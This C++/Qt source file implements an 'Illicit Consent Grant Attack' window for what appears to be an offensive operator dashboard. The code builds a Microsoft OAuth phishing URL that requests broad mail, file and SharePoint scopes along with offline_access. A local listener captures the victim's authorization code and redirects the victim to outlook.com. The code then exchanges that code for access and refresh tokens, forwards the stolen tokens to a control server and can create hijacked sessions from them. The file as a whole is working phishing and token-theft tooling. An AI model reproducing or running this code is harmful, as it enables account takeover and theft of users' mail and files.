#include "IllicitConsentGrant.h"
#include "DashboardWindow.h"
#include "network/ClientTransport.h"
#include "TokenStore.h"
#include "../shared/Protocol.h"
#include <QApplication>
#include <QDebug>

// Helper to decode JWT claims
static inline QString b64UrlDecodeToJsonField(const QString &jwt, const char *field) {
    const QStringList parts = jwt.split('.');
    if (parts.size() < 2) return QString();
    QByteArray payload = parts.at(1).toUtf8();
    int pad = (4 - (payload.size() % 4)) % 4;
    payload.append(QByteArray(pad, '='));
    payload = QByteArray::fromBase64(payload, QByteArray::Base64UrlEncoding);
    QJsonObject o = QJsonDocument::fromJson(payload).object();
    return o.value(field).toString();
}

IllicitConsentGrant::IllicitConsentGrant(DashboardWindow *dashboard, QWidget *parent)
    : QWidget(parent),
      parentDashboard(dashboard),
      tcpServer(nullptr),
      netManager(new QNetworkAccessManager(this))
{
    setAttribute(Qt::WA_DeleteOnClose);
    setWindowTitle("Illicit Consent Grant Attack");
    resize(650, 500);

    QVBoxLayout *layout = new QVBoxLayout(this);

    layout->addWidget(new QLabel("App ID"));
    clientIdInput = new QLineEdit();
    layout->addWidget(clientIdInput);

    layout->addWidget(new QLabel("Client Secret"));
    clientSecretInput = new QLineEdit();
    layout->addWidget(clientSecretInput);

    layout->addWidget(new QLabel("Redirect URI (e.g. https://abc.ngrok-free.app)"));
    redirectInput = new QLineEdit();
    layout->addWidget(redirectInput);

    layout->addWidget(new QLabel("Scopes (space-separated)"));
    scopeInput = new QTextEdit();
    scopeInput->setPlainText(
        "User.Read Contacts.Read Mail.Read Mail.Send Notes.Read.All "
        "MailboxSettings.ReadWrite Files.ReadWrite.All "
        "User.ReadBasic.All Sites.Read.All Sites.ReadWrite.All"
    );
    layout->addWidget(scopeInput);

    // Listener port
    auto *portLayout = new QHBoxLayout();
    portLayout->addWidget(new QLabel("Listener Port"));
    portSpinBox = new QSpinBox();
    portSpinBox->setRange(1024, 65535);
    portSpinBox->setValue(5000);
    portLayout->addWidget(portSpinBox);
    portLayout->addStretch();
    layout->addLayout(portLayout);

    // Session creation toggle
    createSessionCheckbox = new QCheckBox("Create session from captured token");
    createSessionCheckbox->setChecked(false);
    createSessionCheckbox->setToolTip("When enabled, automatically creates a PowerShell session after capturing tokens");
    layout->addWidget(createSessionCheckbox);

    generateBtn = new QPushButton("Generate Phishing Link");
    connect(generateBtn, &QPushButton::clicked, this, &IllicitConsentGrant::handleStart);
    layout->addWidget(generateBtn);

    layout->addWidget(new QLabel("Generated Phishing URL"));
    urlBox = new QTextEdit();
    urlBox->setReadOnly(true);
    urlBox->setFixedHeight(70);
    layout->addWidget(urlBox);

    layout->addWidget(new QLabel("Token Log"));
    tokenOutput = new QTextEdit();
    tokenOutput->setReadOnly(true);
    layout->addWidget(tokenOutput);

    setLayout(layout);

    wireTransport();
}

IllicitConsentGrant::~IllicitConsentGrant() {
    // Clean up TCP server and pending connections
    if (tcpServer) {
        tcpServer->close();
        // Disconnect and abort any pending socket connections
        const auto sockets = tcpServer->findChildren<QTcpSocket*>();
        for (QTcpSocket *socket : sockets) {
            socket->disconnect();
            socket->abort();
        }
    }
    // Clean up any pending network replies
    if (netManager) {
        const auto replies = netManager->findChildren<QNetworkReply*>();
        for (QNetworkReply *reply : replies) {
            reply->disconnect();
            reply->abort();
        }
    }
}

void IllicitConsentGrant::handleStart() {
    clientId = clientIdInput->text().trimmed();
    clientSecret = clientSecretInput->text().trimmed();
    redirectBase = redirectInput->text().trimmed().remove(QRegularExpression("/+$"));
    redirectUri = redirectBase + "/login/authorized";

    QStringList scopeList = scopeInput->toPlainText().split(QRegularExpression("\\s+"), Qt::SkipEmptyParts);

	// Ensure offline_access is included
	if (!scopeList.contains("offline_access")) {
		scopeList.append("offline_access");
	}
	
    scopes = scopeList.join(" ");

    if (clientId.isEmpty() || clientSecret.isEmpty() || redirectBase.isEmpty() || scopes.isEmpty()) {
        QMessageBox::critical(this, "Error", "All fields are required and at least one scope must be provided.");
        return;
    }

    QString phishingUrl = buildPhishingUrl();
    urlBox->setPlainText(phishingUrl);

    startHttpServer();
}

QString IllicitConsentGrant::buildPhishingUrl() {
    QString state = QUuid::createUuid().toString(QUuid::WithoutBraces);
    QString url = QString("https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
                          "?client_id=%1"
                          "&response_type=code"
                          "&redirect_uri=%2"
                          "&scope=%3"
                          "&state=%4")
                      .arg(clientId,
                           QUrl::toPercentEncoding(redirectUri),
                           QUrl::toPercentEncoding(scopes),
                           state);
    return url;
}

void IllicitConsentGrant::startHttpServer() {
    if (tcpServer) return; // already running

    tcpServer = new QTcpServer(this);
    connect(tcpServer, &QTcpServer::newConnection, this, [this]() {
        QTcpSocket *socket = tcpServer->nextPendingConnection();
        if (!socket) return;

        connect(socket, &QTcpSocket::readyRead, this, [this, socket]() {
            QByteArray requestData = socket->readAll();
            QString req(requestData);

            if (req.startsWith("GET")) {
                int qPos = req.indexOf("?");
                int endPos = req.indexOf(" ", qPos);
                if (qPos != -1 && endPos != -1) {
                    QString queryStr = req.mid(qPos + 1, endPos - qPos - 1);
                    QUrlQuery query(queryStr);
                    QString code = query.queryItemValue("code");
                    if (!code.isEmpty()) {
                        exchangeCodeForToken(code);
                    }
                }
            }

            QByteArray response =
                "HTTP/1.1 302 Found\r\n"
                "Location: https://outlook.com\r\n"
                "Content-Length: 0\r\n"
                "Connection: close\r\n\r\n";

            socket->write(response);
            socket->disconnectFromHost();
        });
    });

    quint16 port = static_cast<quint16>(portSpinBox->value());
    if (!tcpServer->listen(QHostAddress::Any, port)) {
        tokenOutput->append(QString("<pre>Listener error: Failed to bind port %1</pre><hr>").arg(port));
    } else {
        tokenOutput->append(QString("<pre>Listener started on http://0.0.0.0:%1</pre><hr>").arg(port));
    }
}

void IllicitConsentGrant::exchangeCodeForToken(const QString &code) {
    QUrl tokenUrl("https://login.microsoftonline.com/common/oauth2/v2.0/token");
    QNetworkRequest request(tokenUrl);
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/x-www-form-urlencoded");

    QUrlQuery body;
    body.addQueryItem("client_id", clientId);
    body.addQueryItem("scope", scopes);
    body.addQueryItem("code", code);
    body.addQueryItem("redirect_uri", redirectUri);
    body.addQueryItem("grant_type", "authorization_code");
    body.addQueryItem("client_secret", clientSecret);

    QByteArray bodyData = body.query(QUrl::FullyEncoded).toUtf8();

    QNetworkReply *reply = netManager->post(request, bodyData);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() != QNetworkReply::NoError) {
            // The token endpoint returns the real reason in the body (error_description)
            // on a 400; fall back to the transport error only if there's nothing there.
            const QJsonObject errObj = QJsonDocument::fromJson(reply->readAll()).object();
            QString detail = errObj.value("error_description").toString();
            if (detail.isEmpty()) detail = errObj.value("error").toString();
            if (detail.isEmpty()) detail = reply->errorString();
            tokenOutput->append(QString("<pre>Error: %1</pre><hr>").arg(detail.toHtmlEscaped()));
            reply->deleteLater();
            return;
        }

        QByteArray response = reply->readAll();
        QJsonDocument json = QJsonDocument::fromJson(response);
        QJsonObject obj = json.object();

        if (obj.contains("access_token")) {
            QString access = obj["access_token"].toString();
            QString refresh = obj["refresh_token"].toString();
            QString scope = obj["scope"].toString();

            // Show truncated tokens to reduce exposure in screenshots/shoulder surfing
            auto maskToken = [](const QString &t) -> QString {
                if (t.size() <= 20) return QString(t.size(), '*');
                return t.left(10) + "..." + t.right(10);
            };
            QString pretty = QString(
                "<b style='color:green;'>Access Token:</b><br><pre>%1</pre><br>"
                "<b style='color:blue;'>Refresh Token:</b><br><pre>%2</pre><hr>"
            ).arg(maskToken(access), maskToken(refresh));
            tokenOutput->append(pretty);

            // Log token to server
            logTokenToServer(access, refresh, scope);

            // Store in TokenStore for plugin auto-linking
            QString tempSessionId = QString("illicit_consent_%1").arg(QUuid::createUuid().toString(QUuid::WithoutBraces));
            TokenInfo tokenInfo;
            tokenInfo.accessToken = access;
            tokenInfo.refreshToken = refresh;
            tokenInfo.resource = QStringLiteral("https://graph.microsoft.com");
            TokenStore::instance()->storeToken(tempSessionId, tokenInfo);

            // If user wants to create a session from this token
            if (createSessionCheckbox->isChecked()) {
                createSessionFromToken(access, refresh, QStringLiteral("https://graph.microsoft.com"));
            }
        } else {
            tokenOutput->append(QString("<pre>%1</pre><hr>").arg(QString::fromUtf8(response)));
        }

        reply->deleteLater();
    });
}

QObject* IllicitConsentGrant::locateTransport() const {
    if (auto *t = qApp->findChild<ClientTransport*>()) return t;
    if (auto *o = qApp->findChild<QObject*>("ClientTransport")) return o;
    return nullptr;
}

void IllicitConsentGrant::logTokenToServer(const QString &accessToken,
                                           const QString &refreshToken,
                                           const QString &scope)
{
    if (accessToken.isEmpty()) {
        return; // Nothing to log
    }

    QObject *transportObj = locateTransport();
    if (!transportObj) {
        qWarning() << "[IllicitConsent] Cannot log token: no transport found";
        return;
    }

    // Generate a unique session ID for illicit consent grant phishing
    QString sessionId = QString("illicit_consent_%1").arg(QUuid::createUuid().toString(QUuid::WithoutBraces));

    // Extract claims from JWT for proper logging
    QString upn = b64UrlDecodeToJsonField(accessToken, "upn");
    if (upn.isEmpty()) {
        upn = b64UrlDecodeToJsonField(accessToken, "preferred_username");
    }
    if (upn.isEmpty()) {
        upn = b64UrlDecodeToJsonField(accessToken, "unique_name");
    }
    QString tenantId = b64UrlDecodeToJsonField(accessToken, "tid");
    QString aud = b64UrlDecodeToJsonField(accessToken, "aud");

    // Resource is typically Graph for illicit consent
    QString resource = aud.isEmpty() ? QStringLiteral("https://graph.microsoft.com") : aud;

    QJsonObject req;
    req.insert(Protocol::F_ACTION, Protocol::ACTION_LOG_TOKEN);
    req.insert("sessionId", sessionId);
    req.insert("source", "illicit_consent_grant");
    req.insert("accessToken", accessToken);
    if (!refreshToken.isEmpty())
        req.insert("refreshToken", refreshToken);
    if (!scope.isEmpty())
        req.insert("scope", scope);
    if (!upn.isEmpty())
        req.insert("user", upn);
    if (!tenantId.isEmpty())
        req.insert("tenantId", tenantId);
    if (!resource.isEmpty())
        req.insert("resource", resource);

    if (auto *typed = qobject_cast<ClientTransport*>(transportObj)) {
        typed->sendJson(req);
    } else {
        QMetaObject::invokeMethod(transportObj, "sendJson", Q_ARG(QJsonObject, req));
    }

#ifndef QT_NO_DEBUG
    qDebug() << "[IllicitConsent] Token logged for session:" << sessionId.left(8) << "user:" << upn;
#endif
}

void IllicitConsentGrant::wireTransport() {
    QObject *transportObj = locateTransport();
    if (!transportObj || hookConnected) return;

    if (auto *typed = qobject_cast<ClientTransport*>(transportObj)) {
        connect(typed, &ClientTransport::messageReceived, this,
                [this](const QJsonObject &obj) {
                    const QString act = obj.value(Protocol::F_ACTION).toString();
                    const QString status = obj.value(Protocol::F_STATUS).toString();
                    const QString respRid = obj.value("rid").toString();
                    const QString sid = obj.value("sessionId").toString();

                    // Match only our pending rid
                    if (!pendingRid.isEmpty() && !respRid.isEmpty() && respRid != pendingRid)
                        return;

                    if (act == QStringLiteral("session_created")) {
                        if (sessionHandled) return;
                        sessionHandled = true;
                        pendingRid.clear();

                        const QString user = obj.value("user").toString("Unknown");
                        const QString tenantId = obj.value("tenantId").toString("N/A");
                        const QString domain = obj.value("domain").toString("N/A");
                        const QString res = obj.value("resource").toString("N/A");

                        // Store token in TokenStore for the new session
                        TokenInfo tokenInfo;
                        tokenInfo.accessToken = pendingAccessToken;
                        tokenInfo.refreshToken = pendingRefreshToken;
                        tokenInfo.resource = pendingResource;
                        TokenStore::instance()->storeToken(sid, tokenInfo);

                        // Update dashboard
                        if (parentDashboard) {
                            parentDashboard->addSessionRow(sid, user, tenantId, domain, res);
                            parentDashboard->logEvent(
                                QString("[+] Session created from illicit consent for %1 (ID: %2)").arg(user, sid));
                            parentDashboard->setSessionTokenExpiry(sid, pendingAccessToken,
                                pendingRefreshToken, pendingResource, tenantId);
                        }

                        // Clear pending state
                        pendingAccessToken.clear();
                        pendingRefreshToken.clear();
                        pendingResource.clear();

                        tokenOutput->append(QString("<b style='color:cyan;'>Session Created:</b> %1 (ID: %2)<hr>")
                            .arg(user, sid));
                        return;
                    }

                    // Handle errors
                    const bool isError = (act == QStringLiteral("error")) ||
                                        (status == Protocol::STATUS_ERR);
                    if (isError && !pendingRid.isEmpty()) {
                        if (sessionHandled) return;
                        sessionHandled = true;
                        pendingRid.clear();
                        const QString msg = obj.value("message").toString("Unknown error");
                        if (parentDashboard) {
                            parentDashboard->logEvent(QString("[-] Session creation failed: %1").arg(msg));
                        }
                        tokenOutput->append(QString("<b style='color:red;'>Session Creation Failed:</b> %1<hr>").arg(msg));
                    }
                });
        hookConnected = true;
    }
}

void IllicitConsentGrant::createSessionFromToken(const QString &accessToken,
                                                  const QString &refreshToken,
                                                  const QString &resource)
{
    QObject *transportObj = locateTransport();
    if (!transportObj) {
        tokenOutput->append("<b style='color:orange;'>Warning:</b> Cannot create session - not connected to server.<hr>");
        return;
    }

    // Decode JWT claims
    QString aud = b64UrlDecodeToJsonField(accessToken, "aud");
    QString upn = b64UrlDecodeToJsonField(accessToken, "upn");
    QString tid = b64UrlDecodeToJsonField(accessToken, "tid");
    QString domain = upn.contains('@') ? upn.section('@', 1, 1) : QStringLiteral("UnknownDomain");

    // Use provided resource or fallback to aud claim
    QString finalResource = resource.isEmpty() ? aud : resource;
    if (finalResource.isEmpty()) {
        finalResource = QStringLiteral("https://graph.microsoft.com");
    }

    // Store pending state for response handling
    sessionHandled = false;
    pendingRid = QUuid::createUuid().toString(QUuid::WithoutBraces);
    pendingAccessToken = accessToken;
    pendingRefreshToken = refreshToken;
    pendingResource = finalResource;

    // Build session request
    QJsonObject req;
    req.insert(Protocol::F_ACTION, Protocol::ACTION_NEW_SESSION);
    req.insert("mode", QStringLiteral("tokens"));
    req.insert("resource", finalResource);
    req.insert("rid", pendingRid);
    req.insert("accessToken", accessToken);
    if (!refreshToken.isEmpty()) req.insert("refreshToken", refreshToken);
    if (!upn.isEmpty()) req.insert("user", upn);
    if (!tid.isEmpty()) req.insert("tenantId", tid);
    if (!domain.isEmpty()) req.insert("domain", domain);

    if (auto *typed = qobject_cast<ClientTransport*>(transportObj)) {
        typed->sendJson(req);
    } else {
        QMetaObject::invokeMethod(transportObj, "sendJson", Q_ARG(QJsonObject, req));
    }

    tokenOutput->append(QString("<b style='color:cyan;'>Creating session for %1...</b><hr>").arg(upn.isEmpty() ? "user" : upn));
    qDebug() << "[IllicitConsent] Session creation requested for" << upn;
}
